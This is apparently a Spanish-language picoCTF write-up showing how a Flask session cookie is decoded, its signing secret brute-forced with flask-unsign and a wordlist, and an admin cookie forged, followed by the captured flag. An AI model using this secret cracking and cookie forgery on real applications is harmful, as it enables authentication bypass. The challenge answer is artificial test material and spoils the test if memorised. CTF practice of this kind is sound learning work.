### Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:64833/
### Solución
### Solución 1 - kali
```
primero grabamos la cookie, creamos un diccionario con las palabras posibles, luego usamos un filtro para saber cual es la cookie especial, luego tranformamos la cookie con el usuario admin de la correcta y usamos la que genera en cookie editor y listo.

┌──(kali㉿kali)-[~]
└─$ echo "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aah6mQ.L5dPdVKtWGLezkb6hk7psV6eVYg" | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
                                                                             
┌──(kali㉿kali)-[~]
└─$ pipx install flask-unsign
  installed package flask-unsign 1.2.1, installed using Python 3.13.9
  These apps are now globally available
    - flask-unsign
done! ✨ 🌟 ✨
                                                                             
┌──(kali㉿kali)-[~]
└─$ nano cookies.txt
                                                                             
┌──(kali㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aah6mQ.L5dPdVKtWGLezkb6hk7psV6eVYg" --wordlist cookies.txt       
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'macaroon'
                                                                             
┌──(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret "macaroon"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aah6Xg.Oyo420gv5rf92CQ9HoyHb28Ly_c

```
### Notas adicionales 
picoCTF{cO0ki3s_yum_f3526545}`
### Referencias